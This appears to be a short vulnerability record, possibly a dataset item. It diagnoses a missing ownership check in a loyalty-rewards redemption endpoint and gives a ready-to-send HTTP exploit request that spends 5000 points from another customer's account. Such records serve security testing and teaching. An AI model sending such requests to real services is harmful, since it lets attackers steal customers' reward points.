diagnosis: The loyalty rewards redemption endpoint validates MongoDB ObjectId format using express-validator, but accesses and deducts points from accountId without verifying that account.userId matches the authenticated req.user.id, allowing attackers to spend other customers' accumulated reward points.
exploit_request:
POST /api/loyalty/points/redeem HTTP/1.1
Host: rewards.retailer.com:6002
Authorization: Bearer <customer_jwt>
Content-Type: application/json

{"accountId": "65b4e1092a9108f912c01994", "pointsToDeduct": 5000}
